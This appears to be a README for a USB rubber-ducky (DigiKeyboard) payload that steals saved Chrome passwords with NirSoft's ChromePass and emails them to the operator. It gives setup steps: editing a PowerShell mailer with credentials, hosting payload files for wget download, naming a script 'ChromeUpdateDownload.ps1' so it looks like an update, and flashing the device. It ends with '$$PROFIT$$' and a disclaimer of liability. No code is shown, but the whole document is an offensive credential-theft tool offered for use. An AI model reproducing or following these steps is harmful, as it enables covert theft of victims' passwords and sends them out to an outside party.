# Chrome-Password-Stealer-Payload
Another payload for the DigiKeyboard rubber ducky. This one steals Chrome passwords and emails them to an email of your choosing (or a text to a phone number of your choosing). As you can see, the command line does not interact with chrome itself because it uses the exe ( called ChromePass from http://www.nirsoft.net/password_recovery_tools.html )to dump all passwords and usernames into a helpful GUI or in the command line and output it into a text file (what I used in my code). 


# DISCLAIMER PLEASE READ
I DO NOT TAKE CREDIT FOR THE EXE. IT IS FROM nirsoft.com AND IS EXTREMELY HELPFUL IN THIS PAYLOAD.
DO NOT HOLD ME LIABLE IF YOU GET IN TROUBLE WITH THAT EXE OR WITH THIS PAYLOAD.
thanks <3

# Setup (similar to other payload)
1) Edit maintenance.ps1 to your preference
* Change the username, password, and recipient
2) Upload the maintenance.ps1 and exe to a filehost (possible to wget from)
* DO NOT RENAME THE FILE
3) Download Arduino IDE

4) Watch this video https://www.youtube.com/watch?v=fGmGBa-4cYQ&t=383s
* Be sure to do everything mentioned in the video to set up your board manager and all that **

5) Create your last PowerShell file, named ChromeUpdateDownload.ps1
* The one in the repo is just an example *
* Be sure to edit it to the correct path on your personal filehost *

6) Upload the last PowerShell file to the same directory as the other files

7) [IMPORTANT] Edit your payload file (ChromePasswordStealer.ino) to the correct wget URL (you'll see where when you open the file)

8) Verify and upload the code to your DigiDucky

9) ???

10) $$PROFIT$$


